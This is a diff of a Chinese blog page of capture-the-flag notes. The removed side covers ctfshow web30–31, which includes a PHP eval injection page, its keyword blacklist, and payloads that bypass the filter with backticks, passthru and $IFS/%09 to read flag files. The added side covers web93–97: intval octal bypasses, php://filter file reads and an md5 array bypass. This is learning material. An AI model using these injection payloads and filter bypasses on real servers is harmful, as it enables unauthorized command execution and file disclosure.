@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="过滤cat、空格," />
+  <meta name="keywords" content="intval函数," />
 
 
 
@@ -79,18 +79,24 @@
 
 
 
-<meta name="description" content="#ctfshow-web30 源码： 123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(0);if(isset($_GET[&amp;#x27;c&amp;#x27;]))&amp;#123;$c&#x3D;$_GET[&amp;#x27;c&amp;#x27;];if(!preg_match(&quot;&#x2F;flag|system|php&#x2F;i&amp;qu">
+<meta name="description" content="web93 过滤了字母，用八进制绕过**?num&#x3D;010574**  web94 在上一题的基础上过滤了数字0， strppos函数：查找在字符串中第一次出现的位置。 所以0不能在第一位 我们可以使用小数点来进行操作。这样通过intval()函数就可以变为int类型的4476 ?num&#x3D;4476.0  web95 过滤了小数点 1?num&#x3D;  010574  也可以 12?num&#x3D;+010574?">
 <meta property="og:type" content="article">
-<meta property="og:title" content="过滤cat、空格">
-<meta property="og:url" content="http://example.com/2022/01/05/%E8%BF%87%E6%BB%A4cat%E3%80%81%E7%A9%BA%E6%A0%BC/index.html">
+<meta property="og:title" content="ctfshow-web93-97">
+<meta property="og:url" content="http://example.com/2022/03/01/ctfshow-web93-97/index.html">
 <meta property="og:site_name" content="web地板成长之路">
-<meta property="og:description" content="#ctfshow-web30 源码： 123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(0);if(isset($_GET[&amp;#x27;c&amp;#x27;]))&amp;#123;$c&#x3D;$_GET[&amp;#x27;c&amp;#x27;];if(!preg_match(&quot;&#x2F;flag|system|php&#x2F;i&amp;qu">
+<meta property="og:description" content="web93 过滤了字母，用八进制绕过**?num&#x3D;010574**  web94 在上一题的基础上过滤了数字0， strppos函数：查找在字符串中第一次出现的位置。 所以0不能在第一位 我们可以使用小数点来进行操作。这样通过intval()函数就可以变为int类型的4476 ?num&#x3D;4476.0  web95 过滤了小数点 1?num&#x3D;  010574  也可以 12?num&#x3D;+010574?">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-01-05T11:50:09.000Z">
-<meta property="article:modified_time" content="2022-01-05T11:56:19.556Z">
+<meta property="og:image" content="http://example.com/2022/03/01/ctfshow-web93-97/QQ5%E6%88%AA%E5%9B%BE20220301192323.png">
+<meta property="og:image" content="http://example.com/2022/03/01/ctfshow-web93-97/jfi5%E6%88%AA%E5%9B%BE20220301192638.png">
+<meta property="og:image" content="http://example.com/2022/03/01/ctfshow-web93-97/5s5QQ%E6%88%AA%E5%9B%BE20220301193433.png">
+<meta property="og:image" content="http://example.com/2022/03/01/ctfshow-web93-97/ffkkQQ%E6%88%AA%E5%9B%BE20220301193852.png">
+<meta property="og:image" content="http://example.com/2022/03/01/ctfshow-web93-97/97rrQQ%E6%88%AA%E5%9B%BE20220301195432.png">
+<meta property="article:published_time" content="2022-03-01T11:20:51.000Z">
+<meta property="article:modified_time" content="2022-03-01T14:38:06.722Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="过滤cat、空格">
+<meta property="article:tag" content="intval函数">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/03/01/ctfshow-web93-97/QQ5%E6%88%AA%E5%9B%BE20220301192323.png">
 
 
 
@@ -120,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://example.com/2022/01/05/过滤cat、空格/"/>
+  <link rel="canonical" href="http://example.com/2022/03/01/ctfshow-web93-97/"/>
 
 
 
 
 
-  <title>过滤cat、空格 | web地板成长之路</title>
+  <title>ctfshow-web93-97 | web地板成长之路</title>
   
 
 
@@ -263,7 +269,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/05/%E8%BF%87%E6%BB%A4cat%E3%80%81%E7%A9%BA%E6%A0%BC/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/01/ctfshow-web93-97/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -280,7 +286,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">过滤cat、空格</h1>
+          <h1 class="post-title" itemprop="name headline">ctfshow-web93-97</h1>
         
 
         <div class="post-meta">
@@ -292,8 +298,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-01-05T19:50:09+08:00">
-                2022-01-05
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-01T19:20:51+08:00">
+                2022-03-01
               </time>
             
 
@@ -315,8 +321,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" itemprop="url" rel="index">
-                    <span itemprop="name">基础知识</span>
+                  <a href="/categories/%E9%A2%98%E5%BA%93/" itemprop="url" rel="index">
+                    <span itemprop="name">题库</span>
                   </a>
                 </span>
 
@@ -352,15 +358,30 @@
       
 
       
-        <p>#ctfshow-web30</p>
-<p>源码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">$c=$_GET[&#x27;c&#x27;];</span><br><span class="line">if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;</span><br><span class="line">eval($c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">过滤了flag、system、php</span><br><span class="line">可以用其他函数代替</span><br><span class="line">system()</span><br><span class="line">passthru()   # passthru — 执行外部程序并且显示原始输出</span><br><span class="line">exec()       # exec — 执行一个外部程序  </span><br><span class="line">shell_exec() # shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec()</span><br><span class="line"></span><br><span class="line">这里需要注意一下，只有system函数是有回显的，其他的函数可以通过echo等显示</span><br><span class="line"></span><br><span class="line">?c=echo passthru(&quot;cat f*&quot;);</span><br><span class="line">?c=echo `cat f*`;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        <h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><p><img src="/2022/03/01/ctfshow-web93-97/QQ5%E6%88%AA%E5%9B%BE20220301192323.png" alt="QQ5截图20220301192323"></p>
+<p>过滤了字母，用八进制绕过**?num=010574** </p>
+<h1 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h1><p><img src="/2022/03/01/ctfshow-web93-97/jfi5%E6%88%AA%E5%9B%BE20220301192638.png" alt="jfi5截图20220301192638"></p>
+<p>在上一题的基础上过滤了数字0，</p>
+<p>strppos函数：查找在字符串中第一次出现的位置。</p>
+<p>所以0不能在第一位</p>
+<p>我们可以使用小数点来进行操作。这样通过intval()函数就可以变为int类型的4476 ?num=4476.0 </p>
+<h1 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h1><p><img src="/2022/03/01/ctfshow-web93-97/5s5QQ%E6%88%AA%E5%9B%BE20220301193433.png" alt="5s5QQ截图20220301193433"></p>
+<p>过滤了小数点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=  010574</span><br></pre></td></tr></table></figure>
 
-<h1 id="ctfshow-web31"><a href="#ctfshow-web31" class="headerlink" title="ctfshow-web31"></a>ctfshow-web31</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">源码：</span><br><span class="line">&lt;?php</span><br><span class="line">    </span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>也可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num=+010574</span><br><span class="line">?num=%2b010574</span><br></pre></td></tr></table></figure>
 
-<h3 id="1-cat被过滤"><a href="#1-cat被过滤" class="headerlink" title="1. cat被过滤"></a>1. cat被过滤</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">grep  在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file</span><br><span class="line">paste  指令会把每个文件以列对列的方式，一列列地加以合并。</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-空格被过滤·"><a href="#2-空格被过滤·" class="headerlink" title="2. 空格被过滤·"></a>2. 空格被过滤·</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;$IFS&#125;   $IFS$9</span><br><span class="line">&gt; &lt; &lt;&gt; 重定向符</span><br><span class="line">%09(需要php环境)</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20  </span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line"></span><br><span class="line">?c=echo(`tac%09f*`);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h1><p><img src="/2022/03/01/ctfshow-web93-97/ffkkQQ%E6%88%AA%E5%9B%BE20220301193852.png" alt="ffkkQQ截图20220301193852"></p>
+<p>?u=/var/www/html/flag.php              绝对路径</p>
+<p>在linux下面表示当前目录是 ./  </p>
+<p>?u=./flag.php                          相对路径</p>
+<p>?u=php://filter/resource=flag.php      php伪协议 </p>
+<h1 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h1><p><img src="/2022/03/01/ctfshow-web93-97/97rrQQ%E6%88%AA%E5%9B%BE20220301195432.png" alt="97rrQQ截图20220301195432"></p>
+<p>理解不了，强行记忆</p>
+<p>传入数组，比较时，比较传入对象(数组也算对象)的元素，在进行md5加密判断时，md5()函数加密的都是空字符</p>
+<p>通过数组绕过 a[]=1&amp;b[]=2 </p>
+<h1 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h1>
       
     </div>
     
@@ -377,7 +398,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/%E8%BF%87%E6%BB%A4cat%E3%80%81%E7%A9%BA%E6%A0%BC/" rel="tag"># 过滤cat、空格</a>
+            <a href="/tags/intval%E5%87%BD%E6%95%B0/" rel="tag"># intval函数</a>
           
         </div>
       
@@ -390,8 +411,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2022/01/05/%E6%97%A0%E5%8F%82%E6%95%B0%E8%AF%BB%E6%96%87%E4%BB%B6/" rel="next" title="无参数读文件">
-                <i class="fa fa-chevron-left"></i> 无参数读文件
+              <a href="/2022/02/19/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%BF%AE%E9%A5%B0%E7%AC%A6/" rel="next" title="正则表达式修饰符">
+                <i class="fa fa-chevron-left"></i> 正则表达式修饰符
               </a>
             
           </div>
@@ -399,10 +420,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2022/01/05/ctfshow-web32-39/" rel="prev" title="ctfshow-web32~39">
-                ctfshow-web32~39 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -534,7 +551,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ctfshow-web31"><span class="nav-number">1.</span> <span class="nav-text">ctfshow-web31</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-cat%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="nav-number">1.0.1.</span> <span class="nav-text">1. cat被过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E7%A9%BA%E6%A0%BC%E8%A2%AB%E8%BF%87%E6%BB%A4%C2%B7"><span class="nav-number">1.0.2.</span> <span class="nav-text">2. 空格被过滤·</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#web93"><span class="nav-number">1.</span> <span class="nav-text">web93</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web94"><span class="nav-number">2.</span> <span class="nav-text">web94</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web95"><span class="nav-number">3.</span> <span class="nav-text">web95</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web96"><span class="nav-number">4.</span> <span class="nav-text">web96</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web97"><span class="nav-number">5.</span> <span class="nav-text">web97</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web98"><span class="nav-number">6.</span> <span class="nav-text">web98</span></a></li></ol></div>
             
 
           </div>
